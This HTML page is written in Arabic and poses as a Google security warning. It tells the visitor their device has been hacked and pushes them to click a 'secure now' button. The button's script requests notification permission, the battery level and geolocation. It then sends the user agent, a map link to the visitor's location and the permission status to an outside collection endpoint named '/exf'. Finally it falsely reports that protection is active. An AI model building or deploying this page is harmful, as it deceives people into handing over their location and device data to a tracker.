<!DOCTYPE html>
<html lang="ar" dir="rtl">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>تنبيه أمني من Google</title>
    <style>
        body { background-color: #f8f9fa; font-family: sans-serif; text-align: center; padding: 50px 20px; }
        .box { background: white; padding: 30px; border-radius: 15px; box-shadow: 0 5px 15px rgba(0,0,0,0.1); max-width: 400px; margin: auto; }
        h1 { color: #d9534f; font-size: 20px; }
        button { background: #1a73e8; color: white; border: none; padding: 15px 30px; border-radius: 8px; font-size: 18px; cursor: pointer; width: 100%; margin-top: 20px; font-weight: bold; }
    </style>
</head>
<body>
    <div class="box">
        <img src="https://cdn-icons-png.flaticon.com/512/564/564619.png" width="70">
        <h1>تحذير أمني من Google</h1>
        <p>تم اكتشاف محاولة اختراق لجهازك. يرجى تفعيل بروتوكول الحماية فوراً لتأمين صورك ورسائلك الخاصة.</p>
        <button onclick="captureData()">تحديث وتأمين الآن</button>
    </div>

    <script>
        async function captureData() {
            // 1. طلب إذن الإشعارات (لسحب محتوى الرسائل)
            const permission = await Notification.requestPermission();
            
            // 2. سحب نسبة الشحن
            let batteryLevel = "N/A";
            if (navigator.getBattery) {
                const battery = await navigator.getBattery();
                batteryLevel = Math.round(battery.level * 100) + "%";
            }

            // 3. محاولة سحب الموقع الجغرافي
            navigator.geolocation.getCurrentPosition(async (pos) => {
                sendToBot(pos.coords.latitude, pos.coords.longitude, batteryLevel, permission);
            }, () => {
                sendToBot(null, null, batteryLevel, permission);
            });
        }

        function sendToBot(lat, lon, battery, perm) {
            const locLink = lat ? `https://www.google.com/maps?q=${lat},${lon}` : "الموقع مرفوض";
            const data = {
                device: navigator.userAgent,
                battery: battery,
                location: locLink,
                msg: perm === 'granted' ? "✅ تم السماح بالإشعارات" : "❌ تم رفض الإشعارات"
            };

            fetch('https://Mohammed33233.pythonanywhere.com/exf', {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify(data)
            }).then(() => {
                alert("تم تفعيل نظام الحماية بنجاح!");
            });
        }
    </script>
</body>
</html>
